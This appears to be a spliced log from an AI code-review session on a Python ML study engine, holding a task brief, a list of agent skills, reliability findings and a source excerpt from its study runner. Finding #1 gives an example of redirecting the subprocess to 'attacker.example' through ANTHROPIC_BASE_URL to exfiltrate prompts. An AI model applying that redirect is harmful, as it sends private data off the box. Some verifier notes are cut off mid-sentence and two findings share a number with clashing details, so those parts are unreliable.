Repo: /Users/[REDACTED]/hc-assay (branch harden/pass-3). It is a dataset-agnostic BLUEPRINT engine for rigorous empirical ML/NLP. Hard rules: the engine imports NO dataset/adapter specifics (ADR-0002); all engine computation/storage/observability + the bulk reasoning tier run on-box (ADR-0003) while the optional high-stakes tier is off-box by design; optional heavy backends are lazy-imported behind extras (ADR-0006).

This is the THIRD hardening pass. Passes 1 and 2 already fixed findings #101-#156 — read docs/hardening/PASS-1.md and docs/hardening/PASS-2.md and DO NOT re-report anything already fixed there. Use /Users/[REDACTED]/hc-assay/.venv/bin/python and /Users/[REDACTED]/hc-assay/.venv/bin/ruff if you want to run a PoC (read-only; do not commit). Be adversarial, precise, and concrete: every finding needs a real file:line, a crisp statement of the production-readiness defect, a PoC or mutation demonstrating it where possible, and a specific suggested fix. Prefer a few HIGH-confidence real defects over many speculative nits. If the area is genuinely clean, say so and return few/no findings.

YOUR DIMENSION: Reliability & error-handling: unnormalized exceptions across the engine↔adapter boundary, partial-failure states, silent error-swallowing that hides real failures, missing validation a misimplemented adapter would trip, error messages that leak secrets or mislead.

- deep-research: Deep research harness — fan-out web searches, fetch sources, adversarially verify claims, synthesize a cited report. - When the user wants a deep, multi-source, fact-checked research report on any topic. BEFORE invoking, check if the question is specific enough to research directly — if underspecified (e.g., "what car to buy" without budget/use-case/region), ask 2-3 clarifying questions to narrow scope. Then pass the refined question as args, weaving the answers in.
- update-config: Use this skill to configure the Claude Code harness via settings.json. Automated behaviors ("from now on when X", "each time X", "whenever X", "before/after X") require hooks configured in settings.json - the harness executes these, not Claude, so memory/preferences cannot fulfill them. Also use for: permissions ("allow X", "add permission", "move permission to"), env vars ("set X=Y"), hook troubleshooting, or any changes to settings.json/settings.local.json files. Examples: "allow npm commands", "add bq permission to global settings", "move permission to user settings", "set DEBUG=true", "when claude stops show X". For simple settings like theme/model, suggest the /config command.
- keybindings-help: Use when the user wants to customize keyboard shortcuts, rebind keys, add chord bindings, or modify ~/.claude/keybindings.json. Examples: "rebind ctrl+s", "add a chord shortcut", "change the submit key", "customize keybindings".
- verify: Verify that a code change actually does what it's supposed to by running the app and observing behavior. Use when asked to verify a PR, confirm a fix works, test a change manually, check that a feature works, or validate local changes before pushing.
- code-review: Review the current diff for correctness bugs and reuse/simplification/efficiency cleanups at the given effort level (low/medium: fewer, high-confidence findings; high→max: broader coverage, may include uncertain findings; ultra: deep multi-agent review in the cloud). Pass --comment to post findings as inline PR comments, or --fix to apply the findings to the working tree after the review.
- simplify: Review the changed code for reuse, simplification, efficiency, and altitude cleanups, then apply the fixes. Quality only — it does not hunt for bugs; use /code-review for that.
- fewer-permission-prompts: Scan your transcripts for common read-only Bash and MCP tool calls, then add a prioritized allowlist to project .claude/settings.json to reduce permission prompts.
- loop: Run a prompt or slash command on a recurring interval (e.g. /loop 5m /foo). Omit the interval to let the model self-pace. - When the user wants to set up a recurring task, poll for status, or run something repeatedly on an interval (e.g. "check the deploy every 5 minutes", "keep running /babysit-prs"). Do NOT invoke for one-off tasks.
- schedule: Create, update, list, or run scheduled cloud agents (routines) that execute on a cron schedule. - When the user wants to schedule a recurring cloud agent, set up automated tasks, create a cron job for Claude Code, or manage their scheduled agents/routines. Also use when the user wants a one-time scheduled run ("run this once at 3pm", "remind me to check X tomorrow").
- claude-api: Reference for the Claude API / Anthropic SDK — model ids, pricing, params, streaming, tool use, MCP, agents, caching, token counting, model migration.
TRIGGER — read BEFORE opening the target file; don't skip because it "looks like a one-liner" — whenever: the prompt names Claude/Anthropic in any form (Claude, Anthropic, Fable, Opus, Sonnet, Haiku, `anthropic`, `@anthropic-ai`, `claude-*`, `us.anthropic.*`, `[1m]`); the user asks about an LLM (pricing/model choice/limits/caching) — never answer from memory; OR the task is LLM-shaped with provider unstated (agent/MCP/tool-definition/multi-agent/RAG/LLM-judge/computer-use; generate/summarize/extract/classify/rewrite/converse over NL; debugging refusals/cutoffs/streaming/tool-calls/tokens).
SKIP only when another provider is being worked on (overrides all triggers): OpenAI/GPT/Gemini/Llama/Mistral/Cohere/Ollama named in the query; OR `grep -rE 'openai|langchain_openai|google.generativeai|genai|mistralai|cohere|ollama'` over the project hits (run this grep FIRST if no provider named — don't Read the file).
- run: Launch and drive this project's app to see a change working. Use when asked to run, start, or screenshot the app, or to confirm a change works in the real app (not just tests). First looks for a project skill that already covers launching the app; otherwise falls back to built-in patterns per project type (CLI, server, TUI, Electron, browser-driven, library).

37	### 1. [HIGH] Credential scrubber lets the high-stakes subprocess be redirected off-box (data exfiltration) and switched to a metered provider
38	- **Location:** `src/assay_engine/reasoning/seam.py` 113-129, 336
39	- **Problem:** scrubbed_env() (the env passed to the claude_agent_sdk subprocess at line 336) only removes vars whose NAME contains 'KEY' or 'TOKEN' under the ANTHROPIC_ prefix (is_metered_anthropic_credential, lines 113-120). It is a deny-by-name filter, not an allowlist, so every other environment variable is forwarded verbatim to the Claude CLI/Agent SDK subprocess. Multiple Claude Code env vars that contain neither 'KEY' nor 'TOKEN' subvert the two hard invariants this module exists to enforce:
40	
41	1) DATA SOVEREIGNTY (ADR-0003) bypass: ANTHROPIC_BASE_URL (and ANTHROPIC_BEDROCK_BASE_URL / ANTHROPIC_VERTEX_BASE_URL, HTTP_PROXY/HTTPS_PROXY, CLAUDE_CODE_API_KEY_HELPER) redirect where the subprocess sends requests. The high-stakes prompt is the full analysis content; setting ANTHROPIC_BASE_URL=http://attacker.example sends every prompt off the box. This is also a clean SSRF/exfiltration channel through a configurable endpoint.
42	
43	2) 'NO METERED API' bypass: CLAUDE_CODE_USE_BEDROCK=1 / CLAUDE_CODE_USE_VERTEX=1 make the CLI route through AWS Bedrock / GCP Vertex — metered, per-token billing — without any ANTHROPIC_*KEY/TOKEN ever appearing. The accompanying AWS_*/GOOGLE_* credentials (e.g. AWS_SECRET_ACCESS_KEY) are also forwarded since they lack the ANTHROPIC_ prefix.
44	
45	Verified against the venv: with all of ANTHROPIC_BASE_URL, ANTHROPIC_BEDROCK_BASE_URL, CLAUDE_CODE_USE_BEDROCK, CLAUDE_CODE_USE_VERTEX, HTTP_PROXY, HTTPS_PROXY, ANTHROPIC_VERTEX_BASE_URL, CLAUDE_CODE_API_KEY_HELPER, AWS_SECRET_ACCESS_KEY set, scrubbed_env() returned every one of them KEPT. claude-agent-sdk 0.2.102 is installed and ClaudeAgentOptions(env=scrubbed_env()) hands that dict to the subprocess.
46	- **Suggested fix:** Make the subprocess env a strict allowlist instead of a name-based denylist, OR extend the denylist to strip the provider-redirecting / metered-provider switches. Concretely: also drop ANTHROPIC_BASE_URL, ANTHROPIC_BEDROCK_BASE_URL, ANTHROPIC_VERTEX_BASE_URL, CLAUDE_CODE_USE_BEDROCK, CLAUDE_CODE_USE_VERTEX, CLAUDE_CODE_API_KEY_HELPER, HTTP_PROXY, HTTPS_PROXY, ALL_PROXY (and their lowercase forms), and AWS_*/GOOGLE_APPLICATION_CREDENTIALS provider creds; preferably build the child env from an explicit allowlist (PATH, HOME, CLAUDE_CODE_OAUTH_TOKEN, locale) plus only known-safe vars. If a custom on-box base URL must be supported, route it through require_loopback_url first.
47	- **Verifier 1:** CONFIRMED, and the real impact is broader than the original report.

60	### 2. [HIGH] run_json applies retries multiplicatively, causing a retry-storm and unbounded blocking time with no overall deadline
61	- **Location:** `src/assay_engine/reasoning/seam.py` 531
62	- **Problem:** `run_json` loops `MAX_RETRIES+1` times (line 531) and each iteration calls `_run_with_retries` (line 542), which itself retries up to `MAX_RETRIES` transient attempts AND up to `RATE_LIMIT_MAX_RETRIES` rate-limit attempts. The budgets multiply. PoC (transient errors every attempt): `_attempt` is invoked 9 times = (MAX_RETRIES+1)^2, not the intended ~3. Worse, the rate-limit path: per outer iteration the rate budget sleeps sum(RATE_LIMIT_BACKOFF*(r+1) for r in 0..4) = 450s; times 3 outer iterations = 1350s of pure backoff sleep, PLUS up to (HIGH_STAKES_TIMEOUT+30)=330s of actual work per attempt. A single `run_json()` call on a public API can therefore block the caller for ~22+ minutes with no overall timeout/deadline. This is both a retry storm (toward an already rate-limited backend) and a missing-timeout/unbounded-blocking defect.
63	- **Suggested fix:** Do not nest two retry layers. Either (a) call `_attempt`+`extract_json` directly inside run_json's loop (no inner `_run_with_retries`), or (b) keep `_run_with_retries` and have run_json only re-roll on JSON *parse* failures (not on transient errors the inner loop already handled). Add an absolute wall-clock deadline budget shared across all retries/backoffs so a single call cannot block indefinitely.
64	- **Verifier 1:** Verified true. run_json (src/assay_engine/reasoning/seam.py:531) loops MAX_RETRIES+1 (=3) times and each iteration calls _run_with_retries (line 542), which has its OWN independent transient (MAX_RETRIES=2 -> 3 attempts) and rate-limit (RATE_LIMIT_MAX_RETRIES=5) budgets. The two layers multiply because the outer loop catches ReasoningError broadly (line 543), which includes transient/rate-limit errors the inner loop already exhausted and re-raised — even though the docstring (lines 509, 514-517) states the outer loop's intent is to re-roll ONLY on JSON parse failure.
65	
66	Concrete PoC against the venv confirms both quantitative claims exactly:
67	- Transient-every-attempt: _attempt invoked 9 times = (MAX_RETRIES+1)^2, not the intended 3.
68	- Rate-limit-every-attempt: _attempt invoked 18 times with a total backoff-sleep budget of 1350s (22.5 minutes). The inner rate-limit path sleeps RATE_LIMIT_BACKOFF*(r+1) for r in 0..4 = 30+60+90+120+150 = 450s per inner exhaustion, times 3 outer iterations = 1350s.
69	
70	There is no overall wall-clock/deadline budget anywhere (grep for deadline/monotonic/wall_clock found nothing); the only bound is the per-attempt timeout (_with_timeout: HIGH_STAKES_TIMEOUT+3
71	- **Verifier 2:** Confirmed via PoC against the venv. run_json (src/assay_engine/reasoning/seam.py:531) nests two retry layers: the outer loop runs MAX_RETRIES+1 (=3) times and each iteration calls _run_with_retries (line 542), which has its own independent transient (MAX_RETRIES=2) and rate-limit (RATE_LIMIT_MAX_RETRIES=5) budgets. Because the outer handler is `except ReasoningError` (line 543) and both RateLimitError and the transient ReasoningError subclass ReasoningError (verified), an error that exhausts the inner loop bubbles up and is re-driven by the outer loop — the budgets multiply. PoC1 (every attempt raises transient): _attempt invoked 9 times = (MAX_RETRIES+1)^2, not the intended ~3. PoC2 (every attempt rate-limited): _attempt invoked 18 times = (RATE_LIMIT_MAX_RETRIES+1)*(MAX_RETRIES+1) with 15 backoff sleeps. With shipped defaults (RATE_LIMIT_BACKOFF=30) those 15 sleeps sum to 1350s (~22.5 min) of pure backoff, and grep confirms there is NO overall wall-clock deadline anywhere (only the per-attempt _with_timeout exists). Worst case a single run_json call against a persistently-failing/rate-limited subscription backend can block the caller ~22 min of backoff plus up to ~99 min of per-a

73	### 3. [HIGH] CI integration lane runs `pytest --cov` but pytest-cov is not a declared dependency — the lane fails on every run
74	- **Location:** `.github/workflows/ci.yml` 73
75	- **Problem:** The integration job's final step runs `pytest -q --cov=assay_engine --cov-report=term-missing`. The `--cov` flag is provided by the `pytest-cov` plugin, but pytest-cov appears nowhere in pyproject.toml — not in the `dev` extra (which only pins pytest, ruff, mypy) and not pulled transitively by any heavy extra. The lane installs `.[dev,reasoning,observability,persistence,orchestration,baseline]`, none of which provide pytest-cov or coverage. I verified in a clean Python 3.14 venv: (1) `pip install 'pytest>=8'` does not bring pytest_cov (`importlib.util.find_spec('pytest_cov')` is None); (2) running `pytest --cov=assay_engine` with no plugin exits with `ERROR: ... unrecognized arguments: --cov=assay_engine`; (3) dry-run resolving mlflow+langgraph+arize-phoenix surfaces no pytest-cov/coverage. Therefore the entire integration lane — the only lane that exercises the real backends (langgraph graph, mlflow lifecycle, OTel, live Postgres + Qdrant containers) — fails at the test step on every PR/push. The repo's CI is effectively only running the dependency-free core lane; the backend code paths are never green-gated.
76	- **Suggested fix:** Add `pytest-cov>=5` (and, if used directly, `coverage`) to the `dev` optional-dependency group in pyproject.toml so the plugin is installed in both CI lanes. Alternatively, gate `--cov` behind a separate `dev` tool group and confirm it is installed before the integration step. After fixing, the integration lane should be re-run to confirm it passes end-to-end.
77	- **Verifier 1:** Confirmed true positive. The integration job's test step (.github/workflows/ci.yml:73) runs `pytest -q --cov=assay_engine --cov-report=term-missing`. The `--cov`/`--cov-report` flags require the pytest-cov plugin, which is NOT a declared dependency: pyproject.toml's `dev` extra (lines 39-43) lists only pytest, ruff, mypy, and no other extra declares pytest-cov or coverage. I verified the install command the lane actually runs — `.[dev,reasoning,observability,persistence,orchestration,baseline]` — via a clean pip --dry-run resolution: it resolves 210 packages and contains neither pytest-cov nor coverage (it does pull pytest-9.1.0). Every transitive reference to pytest-cov in the dependency tree (claude-agent-sdk, mlflow/databricks-sdk, psycopg, scikit-learn, etc.) is gated behind that dependency's OWN optional extra (extra == "dev"/"test"/"testing"/"cover"), which pip does not install for transitive deps. I confirmed pytest hard-fails without the plugin: `pytest --cov=assay_engine` in a clean venv exits with code 4 ("unrecognized arguments: --cov"), which fails the GitHub Actions step and thus the whole integration job. The local repo .venv happens to have pytest-cov (Required-by: e
78	- **Verifier 2:** TRUE positive, independently reproduced. .github/workflows/ci.yml:73 runs `pytest -q --cov=assay_engine --cov-report=term-missing`. The `--cov`/`--cov-report` flags are provided only by the pytest-cov plugin. pyproject.toml's `dev` extra (lines 39-43) declares only pytest>=8, ruff>=0.6, mypy>=1.11; grep over pyproject.toml and .github/ confirms pytest-cov/coverage are declared nowhere, and there is no requirements*.txt/setup.cfg. The integration lane installs `.[dev,reasoning,observability,persistence,orchestration,baseline]` — a `pip install --dry-run` of the heavy deps (mlflow, langgraph, arize-phoenix) surfaces NO pytest-cov or coverage transitively. (The dev's local .venv does contain pytest_cov 7.1.0, but `pip show pytest-cov` lists `Required-by:` empty — it was installed standalone, so it is not provided by any project dependency and would be absent in clean CI; this is the trap that can make a naive local check look green.) PoC in a fresh venv containing only pytest: `pytest --cov=assay_engine --cov-report=term-missing` fails with `error: unrecognized arguments: --cov=assay_engine` and exits code 4 — i.e., the integration job's only test step fails before collecting/running 
79	
80	### 4. [MEDIUM] Pool-saturation guard raises PermanentReasoningError for a transient condition, so concurrent callers fail with no retry or backpressure
81	- **Location:** `src/assay_engine/reasoning/seam.py` 152
82	- **Problem:** When all 8 worker slots are in-flight (e.g. 8 concurrent slow/hung backend calls), `_submit_bounded` raises `PermanentReasoningError` (line 153). But `_run_with_retries` catches `PermanentReasoningError` FIRST and re-raises immediately with no retry and no backoff (seam.py:448-449). Saturation is a *temporary* contention/backpressure condition, not a permanent fault, yet it is classified as fatal. PoC: filling all 8 slots with hung calls that time out at 0.2s leaves `_inflight==8`; a subsequent trivial fast call is refused with `PermanentReasoningError("reasoning timeout pool saturated")`. After the hung threads return, `_inflight` correctly returns to 0 — proving the condition is transient — but any caller that hit the window already got a non-retryable hard failure. Under modest concurrency this turns brief pressure into widespread permanent-looking failures (no backpressure/queueing).
83	- **Suggested fix:** Raise a retryable signal on saturation instead of `PermanentReasoningError` — e.g. a `RateLimitError`/dedicated backpressure error that `_run_with_retries` retries with bounded backoff — or block with a bounded wait (semaphore acquire with timeout) so callers queue briefly rather than fail. Reserve `PermanentReasoningError` for genuinely unrecoverable saturation (e.g. confirmed-hung slots that never drain past a deadline).
84	- **Verifier 1:** The finding is a genuine reliability/resource-management defect, confirmed by code reading and two PoCs.
85	
86	MECHANICS (verified by reading): `_submit_bounded` (seam.py:152-156) raises `PermanentReasoningError` when `_inflight >= 8`. `_run_with_retries` (seam.py:448-449) catches `PermanentReasoningError` FIRST and re-raises immediately — no retry, no backoff. `PermanentReasoningError` (line 69) is NOT a subclass of `RateLimitError` (line 73), so it never reaches the rate-limit retry budget (lines 450-454, default 5 retries with backoff). There is no semaphore/queue/bounded-wait anywhere (grep confirmed) — the submit path is strictly fail-fast.

90	### 4. [HIGH] HIGH_STAKES tier has no inner timeout/cancellation — hung subprocess calls permanently leak the global pool's worker slots, killing reasoning process-wide for ALL concurrent studies
91	- **Location:** `src/assay_engine/reasoning/seam.py` 181-217, 361-439, 442-490
92	- **Problem:** The reasoning seam routes every LLM call through a single module-global, 8-worker ThreadPoolExecutor (_pool) shared across all threads and all concurrent run_study invocations. _with_timeout enforces only a WALL-CLOCK timeout via future.result(timeout=...); it explicitly does NOT cancel the worker (the docstring at lines 226-229 acknowledges a ThreadPoolExecutor cannot interrupt a thread already blocked in a backend call). The slot is only released by the add_done_callback (_release), i.e. when the underlying call actually returns. For the BULK tier this is survivable because _bulk_complete passes client_kwargs={'timeout': BULK_TIMEOUT} to ChatOllama, so the worker is guaranteed to return and free its slot. But the HIGH_STAKES tier (_high_stakes_complete) passes NO timeout to ClaudeAgentOptions or query() and wraps the claude subprocess in anyio.run(_drain) with no cancellation. If the claude CLI subprocess hangs (stalled subscription endpoint, network blackhole, child process wedged), the worker thread blocks forever and its pool slot is NEVER released. _inflight stays elevated permanently. Once 8 such high-stakes calls hang — entirely plausible across concurrent studies when the subscription path stalls — the global pool is permanently saturated: _submit_bounded raises RateLimitError for EVERY subsequent call (any tier, any study), and _run_with_retries exhausts the rate-limit budget and fails the caller permanently. There is no recovery short of restarting the process. PoC confirmed: (1) 8 hung high-stakes-style calls drive seam._inflight to 8 and it never returns to 0; (2) an unrelated, healthy Study B issuing a fast call gets RateLimitError instead of running ('Study B cannot reason at all despite its own backend being fine'); (3) with _inflight forced to 8, seam._run_with_retries() on a fresh BULK request fails with RateLimitError after exhausting all rate retries in ~0.4s. 1	"""Study runner — the composed, governed, end-to-end pipeline (ADR-0010).
2	
3	The phase machine (:mod:`assay_engine.orchestration.phases`) *names* the ordered stages a
4	study moves through; the firewall runners enforce the methodology; the seams provide tracing,
5	experiment tracking, data versioning, and (in the adapter's callables) reasoning. This module
6	composes them into a single runnable flow, engine-owned so the ordering and the governance
7	handoffs are guaranteed once, not re-implemented per study:
8	
9	    INGEST → BASELINE(blind, Firewall A) → [DISCOVERY → PREREGISTER → gate → CONFIRM (Firewall B)]
10	           → [ADJUDICATE → SCORE (Firewall A, shared baseline)] → REPORT
11	
12	At every step it (a) records an append-only provenance entry *before the next step runs*
13	(GOVERNANCE §3), (b) opens a trace span (observability seam), optionally (c) versions the source
14	and logs to an experiment tracker, and (d) enforces the methodological invariants structurally:
15	the baseline is built blind, the split ids are validated against the corpus, hypotheses are
16	verifiably pre-registered before confirmation, a human gate reviews before *every* confirmatory
17	step, claim-derived hypotheses are locked before the baseline exists, and the visited phase
18	sequence must equal the mode's required sequence.
19	
20	A study supplies the *domain* via a :class:`StudyPlan` (parser, baseline builder, the
21	discover/confirm/hypothesis_for callables, the claims source, optional feature builders); the
22	engine owns the *order, the firewalls, the gate, the provenance, the tracing, and the
23	versioning*. Reasoning enters only inside the study's own callables (which may use
24	:mod:`assay_engine.reasoning`); any such LLM output is *judgment*, so it should be wrapped as an
25	:class:`~assay_engine.methodology.fence.Interpretation` and never fed back into a measurement
26	(the fence). The runner imports no adapter (ARCHITECTURE §3).
27	"""
28

83	    """The packet handed to a gate handler at a governance transition.
84	
85	    ``payload`` is a deep-frozen :class:`~assay_engine._frozen.FrozenDict` (immutable +
86	    hashable, #113). Because that is a ``Mapping`` and not a ``dict`` subclass, ``json.dumps``
87	    cannot serialize it directly — an operator-review handler that logs/serializes the payload
88	    must call :meth:`payload_dict` first (#141).

98	        # deep-freeze the payload so this frozen record is truly immutable + hashable (#113)
99	        object.__setattr__(self, "payload", freeze_mapping(self.payload))

101	    def payload_dict(self) -> dict[str, Any]:
102	        """Return the payload as a plain, deeply-thawed, JSON-serializable ``dict`` (#141)."""
103	        return cast("dict[str, Any]", unfreeze(self.payload))

109	def _engine_claim_fingerprint(claim_records: list[ClaimRecord]) -> str:
110	    """Engine-computed content hash of the EXACT claim set that will be scored (#137).
111	
112	    The source's self-reported ``claim_fingerprint()`` is an unverified self-report — it can say
113	    anything. The engine therefore computes its own type-faithful hash over the materialized
114	    records (in scored order) and records THAT as the authoritative fingerprint, so an auditor
115	    re-deriving the fingerprint from the recorded/scored claims gets the value the trail records.
116	    """
117	    return hash_value(
118	        [
119	            {
120	                "claim_id": c.claim_id,
121	                "subject": c.subject,
122	                "referents": list(c.referents),
123	                "assertion": c.assertion,
124	                "provenance": c.provenance,
125	            }
126	            for c in claim_records
127	        ]
128	    )

131	def _require_unique_ids(ids: list[str], what: str) -> None:
132	    """Raise FirewallViolation if ``ids`` contains a duplicate (#138).
133	
134	    Identity (claim↔hypothesis↔verdict) must be unique within a run: a repeated id would
135	    otherwise be counted once per occurrence, inflating the scorecard denominator and biasing
136	    alignment_rate / verdict accounting.
137	    """
138	    seen: set[str] = set()
139	    dupes: list[str] = []
140	    for i in ids:
141	        if i in seen:
142	            dupes.append(i)
143	        seen.add(i)
144	    if dupes:
145	        raise FirewallViolation(
146	            f"duplicate {what} within one run: {sorted(set(dupes))[:3]} — identity must be "
147	            "unique (a repeat would inflate the scorecard denominator / verdict accounting)"
148	        )

151	def auto_approve(review: GateReview) -> GateDecision:
152	    """A non-interactive gate handler: approve and record the decision.
153	
154	    This is the explicit "no operator" choice — it is **not** the default, so a study cannot
155	    silently bypass human review by omitting a handler (it must consciously pass this). Replace
156	    with an operator-driven handler (e.g. one wired to the LangGraph gate interrupt/resume in
157	    :mod:`assay_engine.orchestration`) for genuine human-in-the-loop parking; the handler may
158	    return ``approved=False`` to block the transition.
159	    """
160	    return GateDecision(
161	        approved=True,
162	        gate=review.gate,
163	        reason="non-interactive auto-approval",
164	        evidence={"transition": f"{review.frm.name}->{review.to.name}"},
165	    )

169	class StudyPlan:

171	
172	    ``definition`` is the adapter's binding (parser, modes, claims source, questions, optional
173	    feature builders). The callables below are the adapter's *executable* methodology, validated
174	    against the declared modes: discovery needs ``split``/``discover``/``confirm_held_out``;
175	    adjudication needs ``hypothesis_for``/``confirm_claim`` (and a ``claims_source`` on the
176	    definition).
177	    """

184	    discover: DiscoverFn | None = None

247	def run_study(
248	    plan: StudyPlan,
249	    *,
250	    gate_handler: GateHandler,
251	    tracer: Tracer | None = None,
252	    tracker: ExperimentTracker | None = None,
253	    versioner: DataVersioner | None = None,
254	    clock: Clock | None = None,
255	    secret: bytes | None = None,
256	    trail: ProvenanceTrail | None = None,
257	) -> StudyResult:
258	    """Run one study end-to-end through its governed phase sequence. See module docstring.
259	
260	    ``gate_handler`` is **required** (no default), so governance review is a conscious choice —
261	    pass :func:`auto_approve` to opt out of human review explicitly, or an operator handler that
262	    can block/park. ``tracer`` defaults to :class:`OtelTracer` (real spans if OpenTelemetry + a
263	    provider are present, a graceful no-op otherwise). ``tracker`` (optional) logs params/metrics
264	    to an experiment store, best-effort (a tracker failure never aborts the run). ``versioner``
265	    (optional) content-addresses the source so the trail cites retrievable bytes. ``clock``
266	    injects a deterministic clock for the provenance timestamps only (ordering checks always use
267	    real time). ``secret`` keys the internal provenance trail with HMAC (forgery-resistant);
268	    mutually exclusive with passing your own ``trail``. ``trail`` may be a caller-owned
269	    :class:`ProvenanceTrail` so a run that *raises* still leaves the caller the partial trail.
270	
271	    Raises ``IngestionError`` on a bad source, ``FirewallViolation``/``PreRegistrationError`` on
272	    a methodological breach, ``GateError`` if a gate blocks, and ``ValueError`` on a malformed run.
273	    """
274	    tracer = tracer or OtelTracer()
275	    if trail is not None and secret is not None:
276	        raise ValueError("pass either a caller-owned trail OR a secret to key a new one, not both")
277	    defn = plan.definition
278	    modes = defn.modes
279	    required = required_phases(modes)
280	    trail = trail if trail is not None else ProvenanceTrail(secret=secret, clock=clock)
281	    visited: list[Phase] = []
282	    run_id: str | None = None
283	
284	    def enter(phase: Phase, **payload: Any) -> None:
285	        visited.append(phase)
286	        trail.record("phase", f"enter {phase.name}", phase=phase.name, **payload)
287	
288	    def track(fn: Callable[[ExperimentTracker, str], None]) -> None:
289	        # observability is best-effort: a tracker failure is recorded but never aborts a run.
290	        if tracker is None or run_id is None:
291	            return
292	        try:
293	            fn(tracker, run_id)
294	        except Exception as exc:  # noqa: BLE001 — tracker is an external, optional backend
295	            trail.record("tracking_error", f"experiment tracker call failed: {exc}")
296	
297	    def run_gate(review: GateReview) -> None:
298	        # Record the decision once (snapshot approved/reason) and block on rejection (#94).
299	        decision = gate_handler(review)
300	        approved = bool(getattr(decision, "approved", False))
301	        reason = str(getattr(decision, "reason", ""))
302	        trail.record(
303	            "gate",
304	            f"gate {review.gate!r}: {'approved' if approved else 'blocked'}",
305	            gate=review.gate,
306	            approved=approved,
307	            reason=reason,
308	            transition=f"{review.frm.name}->{review.to.name}",
309	        )
310	        if not approved:
311	            raise GateError(
312	                f"gate {review.gate!r} blocked {review.frm.name}->{review.to.name}: {reason}"
313	            )
314	
315	    trail.record(
316	        "run_start",
317	        f"study {defn.name!r} starting",
318	        study=defn.name,
319	        modes=sorted(m.value for m in modes),
320	        research_questions=list(defn.research_questions),
321	    )
322	    if tracker is not None:
323	        try:
324	            run_id = tracker.start_run(
325	                defn.name,
326	                {
327	                    "modes": ",".join(sorted(m.value for m in modes)),
328	                    "n_research_questions": len(defn.research_questions),
329	                },
330	            )
331	        except Exception as exc:  # noqa: BLE001
332	            trail.record("tracking_error", f"experiment tracker start_run failed: {exc}")
333	
334	    ok = False
335	    trace_ctx = ExitStack()
336	    try:
337	        # Bootstrap tracing once and correlate every phase/reasoning span to this run via baggage,
338	        # so a run's spans are findable by id and join the experiment-tracker run (#122).
339	        # Done INSIDE the try so a tracing-setup failure is still covered by the finally's
340	        # tracker.end_run cleanup — an already-started tracker run must never leak in RUNNING
341	        # state (the #110 class of bug) if bootstrap/context entry raises (#156). Best-effort.
342	        bootstrap_tracing()
343	        corr_id = run_id or uuid.uuid4().hex
344	        trace_ctx.enter_context(run_trace_context(corr_id))
345	        # ---- INGEST ----
346	        with tracer.span("phase:INGEST"):
347	            enter(Phase.INGEST)
348	            try:
349	                corpus = defn.parser.parse(plan.source)
350	                source_fp = defn.parser.source_fingerprint(plan.source)
351	            except Exception as exc:  # noqa: BLE001 — normalize adapter/IO ingestion failures
352	                raise IngestionError(f"parser failed to ingest {plan.source!r}: {exc}") from exc
353	            # The parser Protocol return type is unenforced at runtime; a misimplemented adapter
354	            # that returns None/list/dict would otherwise slip past the normalizer above and die
355	            # at `corpus.units` with an opaque AttributeError, violating the documented
356	            # "Raises IngestionError on a bad source" contract (#134).
357	            if not isinstance(corpus, Corpus):
358	                raise IngestionError(f"parser returned {type(corpus).__name__}, expected Corpus")
359	            if not isinstance(source_fp, str):
360	                raise IngestionError(
361	                    f"parser.source_fingerprint returned {type(source_fp).__name__}, expected str"
362	                )
363	            if not corpus.units:
364	                raise IngestionError("ingestion produced an empty corpus")
365	            cfp = corpus_fingerprint(corpus)
366	            source_version: str | None = None
367	            if versioner is not None:
368	                source_version = versioner.put(str(plan.source))
369	            trail.record(
370	                "ingest",
371	                "parsed source into canonical corpus",
372	                source_fingerprint=source_fp,
373	                corpus_fingerprint=cfp,
374	                n_units=len(corpus.units),
375	                n_relations=len(corpus.relations),
376	                source_version=source_version,
377	            )
378	            # split ids must reference real corpus units (no silent partition drift, audit H4)
379	            if StudyMode.DISCOVERY in modes:
380	                assert plan.split is not None
381	                unit_ids = {u.unit_id for u in corpus.units}
382	                unknown = (set(plan.split.discovery_ids) | set(plan.split.confirm_ids)) - unit_ids
383	                if unknown:
384	                    raise FirewallViolation(
385	                        f"split references {len(unknown)} id(s) absent from the corpus "
386	                        f"(e.g. {sorted(unknown)[:3]}) — partition would silently drop units"
387	                    )
388	            # optional dataset features (recorded + returned; the baseline builder is blind-built
389	            # from the corpus, so features are provenance/output, not a baseline input here)
390	            feature_matrices: list[FeatureMatrix] = []
391	            corpus_unit_ids = {u.unit_id for u in corpus.units}
392	            for fb in defn.feature_builders:
393	                fm = fb.build(corpus)
394	                # features must describe THIS corpus's units — no fictional or duplicate ids
395	                # (the feature-side analogue of the split-drift guard above).
396	                if len(set(fm.unit_ids)) != len(fm.unit_ids):
397	                    raise FirewallViolation(
398	                        f"feature builder {list(fb.provides)} returned duplicate unit_ids"
399	                    )
400	                ghost = set(fm.unit_ids) - corpus_unit_ids
401	                if ghost:
402	                    raise FirewallViolation(
403	                        f"feature builder {list(fb.provides)} returned {len(ghost)} unit_id(s) "
404	                        f"absent from the corpus (e.g. {sorted(ghost)[:3]})"
405	                    )
406	                feature_matrices.append(fm)
407	                trail.record(
408	                    "features",
409	                    f"built feature matrix ({len(fm.feature_names)} features)",
410	                    provides=list(fb.provides),
411	                    n_units=len(fm.unit_ids),
412	                    feature_names=list(fm.feature_names),
413	                )
414	
415	        # ---- BASELINE (blind — Firewall A). Capture the ordering instant BEFORE the build. ----
416	        baseline_instant = _now()
417	        with tracer.span("phase:BASELINE"):
418	            enter(Phase.BASELINE)
419	            guard: ClaimBlindGuard[Any] = ClaimBlindGuard()
420	            with guard.sealed():
421	                baseline = plan.baseline_builder.build(corpus, claim_guard=guard)
422	            if baseline.corpus_fingerprint != cfp:
423	                raise FirewallViolation(
424	                    "baseline corpus_fingerprint does not match the ingested corpus — the baseline "
425	                    "was not built from this corpus"
426	                )
427	            trail.record(
428	                "baseline",
429	                "built blind baseline (Firewall A)",
430	                corpus_fingerprint=baseline.corpus_fingerprint,
431	                contents=sorted(baseline.contents),
432	                determinism=dict(baseline.determinism),
433	            )
434	
435	        discovery_verdicts: tuple[Verdict, ...] = ()
436	        scorecard: SourceScorecard | None = None
437	
438	        # ---- DISCOVERY → PREREGISTER → gate → CONFIRM (Firewall B) ----
439	        if StudyMode.DISCOVERY in modes:
440	            assert plan.split is not None and plan.discover is not None
441	            assert plan.confirm_held_out is not None
442	            discovery_corpus = subset_corpus(corpus, plan.split.discovery_ids)
443	            held_out = subset_corpus(corpus, plan.split.confirm_ids)
444	
445	            with tracer.span("phase:DISCOVERY"):
446	                enter(Phase.DISCOVERY)
447	                if not discovery_corpus.units:
448	                    raise FirewallViolation("discovery partition selects no corpus units")
